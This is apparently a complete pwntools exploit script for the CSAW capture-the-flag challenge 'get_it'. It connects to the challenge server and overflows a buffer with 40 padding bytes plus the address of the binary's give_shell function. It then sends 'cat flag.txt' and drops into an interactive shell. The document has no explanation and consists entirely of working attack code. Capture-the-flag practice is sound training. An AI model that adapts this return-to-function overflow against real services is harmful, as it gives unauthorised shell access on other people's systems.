from pwn import *
#p = process("./get_it")
p = remote('pwn.chal.csaw.io' ,9001)
elf = ELF('./get_it')
get_shell = elf.symbols['give_shell']
print(get_shell)
p.recv()
offset = 40
payload = ""
payload += "A"*offset
payload += p64(get_shell)
p.send(payload+"cat flag.txt")
p.interactive()